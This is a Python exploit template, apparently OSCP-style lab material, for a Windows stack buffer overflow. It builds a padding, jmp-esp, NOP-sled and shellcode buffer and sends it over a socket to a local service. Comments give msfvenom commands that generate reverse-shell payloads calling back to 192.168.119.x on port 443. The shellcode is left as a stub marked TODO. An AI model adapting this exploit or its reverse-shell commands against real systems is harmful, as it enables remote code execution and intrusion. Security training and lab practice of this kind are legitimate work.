#!/usr/bin/env python3

'''
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/11/10

windows buffer overflow exploit example.

ref:
    https://github.com/cyhfvg/BOF-fuzzer-python-3-All-in
    https://github.com/3isenHeiM/OSCP-BoF
'''

import socket
import struct

# info {{{1
# badchars \x51 \x00 ?
# }}}


# FIXME: change this {{{1
RHOST="127.0.0.1"
RPORT=2233
buf_totlen=4096
offset_eip=2306
ptr_jmp_esp=0x1120110d
sub_esp_nop_10=b"\x90"*10
offset_esp=2306+12
# }}}

# shellcode {{{1
# example:

# msfvenom -p windows/exec -b '\x00\x04\x05\xA2\xA3\xAC\xAD\xC0\xC1\xEF\xF0' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread

# msfvenom -p windows/exec -b '\x00\x51' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.149 LPORT=443 -e x86/shikata_ga_nai -b '\x00\x51' -f python --var-name shellcode EXITFUNC=thread

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.211 LPORT=443 EXITFUNC=thread -b '\x51\x00' -e x86/shikata_ga_nai -i 2 -f python --var-name shellcode

# TODO: set shellcode
shellcode =  b""
shellcode += b"\xd9\xe1\xba\x46\x3e\x46\xbb\xd9\x74\x24\xf4"

# }}}


# connect socket {{{1
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
# }}}


# bof {{{1
#AAAA***BBBB\x90\x90***shellcodeDDDD***
# filling + eip + padding + sub_esp_10 + shellcode + trailing


buf = b""

# filling
buf += b"A" * (offset_eip - len(buf))

# eip <= `jmp esp` address
buf += struct.pack("<I", ptr_jmp_esp)

# padding <= calc from offset_esp
buf += b"\x90" * (offset_esp - (offset_eip + 4))

# nop_10 <= prepare for msfvenom shellcode's auto overwrite
buf += sub_esp_nop_10

# shellcode
buf += shellcode

# trailing
buf += b"D" * (buf_totlen - len(buf))

buf += b"\n"

print("send buf len: {}".format(len(buf)))
#print(buf)
s.send((buf + b"\n"))
# }}}
